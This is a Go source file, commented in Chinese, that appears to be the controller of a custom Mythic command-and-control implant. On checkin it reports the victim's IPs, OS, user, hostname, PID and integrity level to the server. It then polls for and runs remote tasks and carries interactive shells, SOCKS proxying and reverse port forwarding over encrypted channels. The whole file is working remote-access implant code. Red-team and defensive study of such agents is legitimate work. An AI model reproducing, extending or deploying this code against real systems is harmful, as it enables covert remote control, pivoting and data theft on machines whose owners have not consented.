package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"runtime"
	"strings"
	"sync"
	"time"
)

type controllerTransport interface {
	Send(uuid string, data interface{}, aesKey []byte) ([]byte, error)
	Close() error
}

type pushSessionTransport interface {
	controllerTransport
	StartPushPump(aesKey []byte) error
	SendPush(uuid string, data interface{}, aesKey []byte) error
	Incoming() <-chan []byte
	Errors() <-chan error
}

// AgentController 表示一个独立的 Mythic 通道控制器。
// beacon 和 session 都复用这套逻辑，只是 transport、role 和轮询策略不同。
type AgentController struct {
	role        CallbackRole
	name        string
	config      EmbeddedConfig
	profile     EmbeddedProfile
	transport   controllerTransport
	outbound    *asyncOutboundQueues
	interactive *interactiveSessionRegistry
	socks       *socksRegistry
	rpfwd       *rpfwdRegistry

	callbackMu   sync.RWMutex
	callbackUUID string
	aesKey       []byte
	pollWait     time.Duration
	activeWait   time.Duration
	stopCh       chan struct{}
	sessionLink  string
}

func newAgentController(role CallbackRole, config EmbeddedConfig, profile EmbeddedProfile, transport controllerTransport, sessionLink string) (*AgentController, error) {
	controller := &AgentController{
		role:        role,
		name:        string(role),
		config:      config,
		profile:     profile,
		transport:   transport,
		outbound:    &asyncOutboundQueues{},
		pollWait:    time.Duration(config.PollIntervalSeconds) * time.Second,
		activeWait:  time.Second,
		stopCh:      make(chan struct{}),
		sessionLink: strings.TrimSpace(sessionLink),
	}
	if role == CallbackRoleSession {
		// session 模式面向交互和代理流量，活跃时使用更短的等待间隔。
		controller.pollWait = 250 * time.Millisecond
		controller.activeWait = 100 * time.Millisecond
	}

	if strings.TrimSpace(profile.AESPSK) != "" {
		key, err := base64.StdEncoding.DecodeString(strings.TrimSpace(profile.AESPSK))
		if err != nil {
			return nil, fmt.Errorf("解码 %s AESPSK 失败: %w", profile.Name, err)
		}
		controller.aesKey = key
	}

	controller.interactive = newInteractiveSessionRegistry(controller)
	controller.socks = newSocksRegistry(controller)
	controller.rpfwd = newRpfwdRegistry(controller)
	return controller, nil
}

func (c *AgentController) Run() {
	if c.CallbackUUID() == "" {
		// 正常流程只有首次启动需要 checkin；session_start 预热过的 controller 会跳过这里。
		if err := c.checkin(); err != nil {
			log.Printf("[%s] Checkin 失败: %v\n", c.name, err)
			return
		}
		log.Printf("[%s] Checkin 成功，callback_uuid=%s\n", c.name, c.CallbackUUID())
	}

	if c.role == CallbackRoleSession {
		pushTransport, ok := c.transport.(pushSessionTransport)
		if !ok {
			log.Printf("[%s] 缺少 push session transport，无法进入真 session 模式\n", c.name)
			_ = c.transport.Close()
			return
		}
		if err := c.runPushSession(pushTransport); err != nil {
			log.Printf("[%s] push session 退出: %v\n", c.name, err)
		}
		_ = c.transport.Close()
		log.Printf("[%s] controller 已停止\n", c.name)
		return
	}

	for {
		select {
		case <-c.stopCh:
			_ = c.transport.Close()
			log.Printf("[%s] controller 已停止\n", c.name)
			return
		default:
		}

		tasks, err := c.pollMythic(nil)
		if err != nil {
			log.Printf("[%s] 获取任务失败: %v\n", c.name, err)
			time.Sleep(c.currentPollInterval())
			continue
		}

		if len(tasks) > 0 {
			responses := make([]TaskResponse, 0, len(tasks))
			for _, task := range tasks {
				resp := c.executeTask(task)
				responses = append(responses, resp)
			}
			if err := c.flushTaskResponses(responses); err != nil {
				log.Printf("[%s] 提交响应失败: %v\n", c.name, err)
			}
		}
		time.Sleep(c.currentPollInterval())
	}
}

func (c *AgentController) Stop() {
	select {
	case <-c.stopCh:
		return
	default:
		close(c.stopCh)
	}
	c.interactive.StopAll()
	c.socks.Disable()
	c.rpfwd.StopAll()
}

func (c *AgentController) CallbackUUID() string {
	c.callbackMu.RLock()
	defer c.callbackMu.RUnlock()
	return c.callbackUUID
}

func (c *AgentController) setCallbackUUID(value string) {
	c.callbackMu.Lock()
	defer c.callbackMu.Unlock()
	c.callbackUUID = strings.TrimSpace(value)
}

func (c *AgentController) checkin() error {
	msg := CheckinMessage{
		Action:         "checkin",
		UUID:           c.config.PayloadUUID,
		IPs:            getLocalIPs(),
		OS:             getOSInfo(),
		User:           getCurrentUser(),
		Host:           getHostname(),
		PID:            os.Getpid(),
		Architecture:   runtime.GOARCH,
		Domain:         "",
		IntegrityLevel: getIntegrityLevel(),
		ProcessName:    c.processName(),
	}
	// 初始 checkin 永远使用 payload UUID，成功后 Mythic 会返回新的 callback UUID。
	respData, err := c.transport.Send(c.config.PayloadUUID, msg, c.aesKey)
	if err != nil {
		return err
	}
	var resp MythicMessageResponse
	if err := json.Unmarshal(respData, &resp); err != nil {
		return fmt.Errorf("解析 checkin 响应失败: %w", err)
	}
	if resp.Status != "" && resp.Status != "success" {
		return fmt.Errorf("checkin 失败: %s", firstNonEmpty(resp.Error, resp.Status))
	}
	if resp.Action != "" && resp.Action != "checkin" {
		return fmt.Errorf("checkin 响应 action 异常: %s", resp.Action)
	}
	if resp.ID == "" {
		return fmt.Errorf("响应中未找到 callback UUID")
	}
	c.setCallbackUUID(resp.ID)
	return nil
}

func (c *AgentController) processName() string {
	processName := os.Args[0]
	if c.role == CallbackRoleSession && c.sessionLink != "" {
		processName += " [session:" + c.sessionLink + "]"
	}
	return processName
}

func (c *AgentController) currentPollInterval() time.Duration {
	if c.role == CallbackRoleSession {
		// session 通道有交互/代理流量时尽量贴近实时，否则退回常规 wait。
		if c.interactive.HasActiveSessions() || c.socks.HasActiveSessions() || c.rpfwd.HasActiveSessions() || c.outbound.hasPending() {
			return c.activeWait
		}
		return c.pollWait
	}
	if c.interactive.HasActiveSessions() || c.socks.HasActiveSessions() || c.rpfwd.HasActiveSessions() || c.outbound.hasPending() {
		if c.pollWait > time.Second {
			return time.Second
		}
	}
	return c.pollWait
}

func (c *AgentController) enqueueAsyncResponse(response TaskResponse) {
	c.outbound.enqueueResponse(response)
}

func (c *AgentController) enqueueInteractiveOutput(taskID string, messageType int, data []byte) {
	c.outbound.enqueueInteractive(InteractiveMessage{
		TaskID:      taskID,
		MessageType: messageType,
		Data:        base64.StdEncoding.EncodeToString(data),
	})
}

func (c *AgentController) enqueueSocksOutput(serverID int, data []byte, exit bool) {
	c.outbound.enqueueSocks(SocksMessage{
		ServerID: serverID,
		Data:     base64.StdEncoding.EncodeToString(data),
		Exit:     exit,
	})
}

func (c *AgentController) enqueueRpfwdOutput(serverID int, port int, data []byte, exit bool) {
	c.outbound.enqueueRpfwd(RpfwdMessage{
		ServerID: serverID,
		Data:     base64.StdEncoding.EncodeToString(data),
		Exit:     exit,
		Port:     port,
	})
}
